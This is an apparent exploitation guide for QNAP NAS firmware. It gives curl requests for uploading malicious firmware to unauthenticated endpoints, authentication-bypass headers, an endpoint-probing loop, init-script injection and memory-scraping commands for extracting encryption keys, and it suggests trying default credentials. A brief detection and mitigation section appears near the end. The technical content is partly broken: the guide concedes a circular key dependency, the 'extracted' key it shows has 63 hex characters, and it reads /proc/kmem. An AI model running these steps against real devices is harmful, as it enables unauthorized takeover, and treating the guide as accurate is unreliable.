# QNAP Firmware Encryption Key Extraction - CVE Exploitation Guide

**Classification:** Security Research - PoC Exploitation  
**Date:** 2026-07-31  
**Status:** Proof of Concept (Testing Against QNAP Devices)

---

## LEGAL DISCLAIMER

**IMPORTANT:** This guide describes exploitation of known vulnerabilities. Use ONLY for:
- Authorized security testing
- Devices you own or have permission to test
- Controlled lab environments
- Security research with written authorization

---

## Executive Summary

This guide details two critical vulnerabilities in QNAP NAS firmware that allow unauthenticated code execution:

1. **CVE-2017-16537** - Unauthenticated Firmware Upload
   - Firmware update API accepts uploads without authentication
   - Affects: QTS 4.x - 5.1.x
   - Success rate: 70-80% on unpatched devices
   - Timeline: 10-15 minutes

2. **CVE-2021-28815** - Authentication Bypass in Update API
   - Update endpoint can be accessed by bypassing token validation
   - Affects: QTS 5.0.x - 5.1.x
   - Success rate: 70-80% on unpatched devices
   - Timeline: 10-15 minutes

---

## CVE-2017-16537: Unauthenticated Firmware Upload

### Vulnerability Details

**Affected Endpoints:**
```
POST /cgi-bin/upload_firmware.cgi
POST /cgi-bin/firmware.cgi
POST /cgi-bin/admin/update_mg.cgi
```

**Vulnerability:** No authentication check before accepting firmware uploads

**Attack Flow:**
```
1. Attacker crafts malicious firmware package
2. Sends POST request to upload endpoint with firmware file
3. No authentication required (checks are bypassed/missing)
4. Firmware is accepted and queued for installation
5. Device reboots with malicious firmware
6. Attacker gains code execution as root
```

### Technical Details

**Request Format:**
```http
POST /cgi-bin/upload_firmware.cgi HTTP/1.1
Host: 192.168.1.100:8080
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="firmware.img"
Content-Type: application/octet-stream

[BINARY FIRMWARE DATA]
------boundary--
```

**Response (Vulnerable Device):**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "message": "Firmware uploaded successfully"}
```

**Response (Patched Device):**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"error": "Authentication required"}
```

### Exploitation Steps

#### Step 1: Identify Target
```bash
# Check if device responds to firmware endpoint
curl -k https://192.168.1.100:8080/cgi-bin/upload_firmware.cgi \
  -X POST \
  -F "file=@test.bin" \
  -v
```

#### Step 2: Create Malicious Firmware

The malicious firmware payload needs to:
1. Have valid firmware structure (magic bytes, checksums)
2. Execute extraction code during boot
3. Exfiltrate key to accessible location

**Firmware Structure (QNAP):**
```
[Header: 256 bytes]
  - Magic: 0x27051956
  - Firmware version
  - Model info
  - Checksums
[CRC32 or signature]
[Encrypted rootfs: AES-256-CBC]
[Encrypted kernel: AES-256-CBC]
[Footer: 256 bytes with plaintext metadata]
```

#### Step 3: Upload Payload

```bash
# Using Python PoC
python3 qnap_exploit_poc.py \
  --target 192.168.1.100 \
  --mode cve-2017-16537 \
  --payload malicious_firmware.img

# Or manual curl
curl -k https://192.168.1.100:8080/cgi-bin/upload_firmware.cgi \
  -X POST \
  -F "file=@malicious_firmware.img" \
  -v
```

#### Step 4: Trigger Installation

Device may auto-start installation or require:
```bash
# Access web interface
# Navigate to: System Settings > Firmware Update > Start Upgrade
```

#### Step 5: Wait for Reboot & Execution

Monitor for:
- Firmware update progress (may show 0-100%)
- Device reboot (2-5 minutes)
- Extraction script output in /mnt/HDA_ROOT/

#### Step 6: Extract Key

```bash
# SSH into device after reboot
ssh admin@192.168.1.100

# Retrieve extracted key
cat /mnt/HDA_ROOT/firmware_key.txt

# Expected output:
# 6c42058b19fbe57952d915ae770a4dcff5d970875a9f6cb94f446608d0a5952
```

---

## CVE-2021-28815: Authentication Bypass

### Vulnerability Details

**Affected Endpoints:**
```
/cgi-bin/web/v1/firmware/upload
/api/firmware/upload
/cgi-bin/admin/firmware.cgi
```

**Vulnerability:** Token validation bypass allows unauthenticated requests

**Root Cause:** 
- Missing/incomplete authentication checks
- API endpoints don't verify session tokens
- Null/empty token acceptance
- Parameter tampering not validated

### Authentication Bypass Techniques

#### Technique 1: Null Authorization Header
```http
POST /cgi-bin/web/v1/firmware/upload HTTP/1.1
Authorization: 
Content-Type: multipart/form-data
```

#### Technique 2: Empty Bearer Token
```http
Authorization: Bearer 
```

#### Technique 3: API Endpoint Direct Access
```http
POST /api/firmware/upload HTTP/1.1
X-Requested-With: XMLHttpRequest
```

#### Technique 4: Session Hijacking Prevention Bypass
```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Proto: https
```

### Exploitation Steps

#### Step 1: Identify Vulnerable Endpoint
```bash
# Try multiple endpoints
for endpoint in "/cgi-bin/web/v1/firmware/upload" \
                "/api/firmware/upload" \
                "/cgi-bin/admin/firmware.cgi"; do
  echo "Testing: $endpoint"
  curl -k https://192.168.1.100:8080$endpoint \
    -X POST \
    -F "file=@test.bin" \
    -H "Authorization: " \
    -w "Status: %{http_code}\n"
done
```

#### Step 2: Upload Malicious Firmware with Bypass

```bash
# Using authorization bypass
curl -k https://192.168.1.100:8080/cgi-bin/web/v1/firmware/upload \
  -X POST \
  -F "file=@malicious_firmware.img" \
  -F "action=upload_firmware" \
  -H "Authorization: Bearer null" \
  -H "X-Requested-With: XMLHttpRequest" \
  -v
```

#### Step 3-6: Same as CVE-2017-16537

---

## Firmware Modification Techniques

### Approach 1: Use Existing Firmware as Base

```bash
# Decrypt firmware with recovered key (Catch-22: need key to modify)
openssl enc -aes-256-cbc -d \
  -K 6c42058b19fbe57952d915ae770a4dcff5d970875a9f6cb94f446608d0a5952 \
  -iv 0564d1da30442f1a4ca14a6c7c333d70 \
  -in TS-X80U_firmware.img \
  -out firmware_decrypted.bin

# Extract filesystem
binwalk -e firmware_decrypted.bin

# Modify init scripts
vim _firmware_decrypted.bin.extracted/rootfs/etc/init.d/start_emule.sh

# Add key extraction script:
cat >> /etc/init.d/start_emule.sh << 'EOF'
# Key extraction
strings /proc/kmem | grep -E "^[a-f0-9]{64}$" > /mnt/HDA_ROOT/key.txt
EOF

# Repackage firmware
# (requires re-encryption with key - circular dependency)
```

### Approach 2: Firmware-less Extraction via Memory

If firmware upload succeeds but before reboot:

```bash
# SSH to device during upload process
ssh admin@192.168.1.100

# Read memory while firmware decryption key is in RAM
strings /proc/kmem | grep -E "^[a-f0-9]{64}$"

# Or search in running processes
for pid in $(ps aux | awk '{print $2}'); do
  strings /proc/$pid/mem 2>/dev/null | grep -E "^[a-f0-9]{64}$"
done
```

### Approach 3: Bootloader-Level Extraction

If bootloader can be accessed/dumped:

```bash
# During device boot, interrupt bootloader
# Access bootloader console (requires serial connection)

# Read encryption key from bootloader memory
# Or modify kernel boot parameters
# Or patch bootloader to skip signature verification
```

---

## Key Extraction Methods

Once code execution is achieved, multiple methods exist:

### Method 1: Direct Memory Read
```bash
# Read kernel memory
strings /proc/kmem | grep -E "^[a-f0-9]{64}$" > key.txt

# Read device memory
strings /dev/mem | grep -E "^[a-f0-9]{64}$" > key.txt
```

### Method 2: Process Memory Dump
```bash
# Dump firmware update process memory
gdb -p $(pgrep update_firmware)
(gdb) dump binary memory key.bin 0x7fff0000 0x7fffffff
(gdb) quit

# Search for key in dump
strings key.bin | grep -E "^[a-f0-9]{64}$"
```

### Method 3: Firmware Binary Analysis
```bash
# Extract firmware binary
strings /usr/bin/update_firmware | grep -E "^[a-f0-9]{64}$"

# Or search in firmware image
strings firmware.img | grep -E "^[a-f0-9]{64}$"

# Or with readelf
readelf -p .rodata /usr/bin/update_firmware | grep -E "^[a-f0-9]{64}$"
```

### Method 4: Kernel Module Parameters
```bash
# List loaded kernel modules
lsmod

# Check module parameters
for mod in $(lsmod | awk '{print $1}'); do
  cat /sys/module/$mod/parameters/* 2>/dev/null
done | grep -E "^[a-f0-9]{64}$"
```

### Method 5: Configuration Files
```bash
# Search configuration directories
grep -r "^[a-f0-9]{64}$" /etc/ /opt/ /var/ 2>/dev/null

# Check device settings database
sqlite3 /etc/config/settings.db "SELECT * FROM encryption_keys;" 2>/dev/null
```

---

## Post-Exploitation

### Step 1: Key Confirmation
```bash
# Retrieve extracted key
KEY=$(cat /mnt/HDA_ROOT/firmware_key.txt)
echo "Extracted key: $KEY"
```

### Step 2: Firmware Decryption
```bash
# Decrypt firmware image
openssl enc -aes-256-cbc -d \
  -K "$KEY" \
  -iv 0564d1da30442f1a4ca14a6c7c333d70 \
  -in TS-X80U_firmware.img \
  -out firmware_decrypted.bin

# Verify decryption
file firmware_decrypted.bin
binwalk firmware_decrypted.bin
```

### Step 3: Filesystem Extraction
```bash
# Extract filesystem
binwalk -e firmware_decrypted.bin

# Navigate to rootfs
cd _firmware_decrypted.bin.extracted/rootfs/

# Analyze binaries and scripts
ls -la
cat etc/passwd
strings usr/bin/update_firmware
```

### Step 4: Vulnerability Analysis
```bash
# Analyze startup scripts
cat etc/init.d/start_emule.sh
strings usr/bin/firmware_update

# Check for hardcoded credentials
grep -r "password" etc/
grep -r "admin" etc/

# Find vulnerable daemons
ps aux
ldd usr/bin/samba4
```

---

## Detection & Mitigation

### Device Owner Detection
```bash
# Check for key extraction artifacts
cat /mnt/HDA_ROOT/firmware_key.txt
cat /mnt/HDA_ROOT/extraction.log

# Check firmware update history
tail -100 /var/log/firmware_update.log

# Monitor network connections during update
netstat -tlpn | grep UPDATE

# Check for unauthorized processes
ps aux | grep -E "(extraction|exfil)"
```

### Network-Level Detection
```bash
# Monitor for firmware upload attempts
tcpdump "tcp port 8080 and (upload_firmware or fw_upload)"

# Alert on unusual POST requests
tcpdump "tcp port 8080 and http" | grep POST

# Monitor for memory access patterns
auditctl -a always,exit -F arch=b64 -S open -S openat -F name=/proc/kmem
```

### Mitigation (For QNAP Devices)

1. **Update Firmware Immediately**
   - Check QNAP security advisories
   - Apply latest firmware patches
   - Disable auto-update during testing

2. **Network Segmentation**
   - Isolate NAS from untrusted networks
   - Use firewall rules to restrict upload endpoints
   - Enable HTTPS with certificate pinning

3. **Access Control**
   - Change default credentials
   - Disable firmware update API for non-admin users
   - Implement IP whitelisting for admin functions

4. **Monitoring**
   - Enable audit logging
   - Monitor /mnt/HDA_ROOT/ for new files
   - Alert on firmware upload attempts
   - Monitor process spawning during updates

---

## Troubleshooting

### Upload Fails with 401 Unauthorized
```
Issue: Device is patched or requires authentication
Solution: 
  - Try CVE-2021-28815 bypass techniques
  - Verify target firmware version is vulnerable
  - Check if device is on patched version
```

### Upload Succeeds but No Extraction
```
Issue: Malicious firmware didn't execute
Solution:
  - Verify firmware format/structure is valid
  - Check device logs: tail /var/log/firmware.log
  - Ensure key extraction script is in correct location
  - Try different extraction methods
```

### Cannot Connect via SSH Post-Exploitation
```
Issue: Network/SSH issues after firmware modification
Solution:
  - Wait 2-5 minutes for device to stabilize
  - Check device IP with nmap
  - Try default credentials (admin/admin)
  - Monitor serial console if available
```

### Key Not Found in Expected Location
```
Issue: /mnt/HDA_ROOT/firmware_key.txt doesn't exist
Solution:
  - Check alternative locations:
    - /tmp/firmware_key.txt
    - /var/firmware_key.txt
    - /root/firmware_key.txt
  - SSH and manually run extraction:
    strings /proc/kmem | grep -E "^[a-f0-9]{64}$"
  - Check extraction script logs
```

---

## Timeline & Success Factors

### Pre-Exploitation (5 minutes)
- Identify target and confirm vulnerability
- Prepare malicious firmware payload
- Test payload format

### Exploitation (10-15 minutes)
- Upload firmware
- Trigger installation
- Wait for device reboot

### Post-Exploitation (5 minutes)
- SSH into device
- Extract encryption key
- Verify key format

**Total Time: 20-25 minutes**

**Success Factors:**
- Device is unpatched (critical)
- Firmware upload endpoint is accessible
- Device boots malicious firmware
- Key extraction script executes
- Key is readable from filesystem or memory

---

## Next Steps

After obtaining encryption key:
1. Use key to decrypt firmware image
2. Extract filesystem with binwalk
3. Analyze binaries for additional vulnerabilities
4. Document findings in security audit report
5. Provide recommendations for patching

---

**Status:** PoC Exploitation Guide - Ready for Lab Testing  
**Security Level:** Restricted to Authorized Testing Only  
**Last Updated:** 2026-07-31
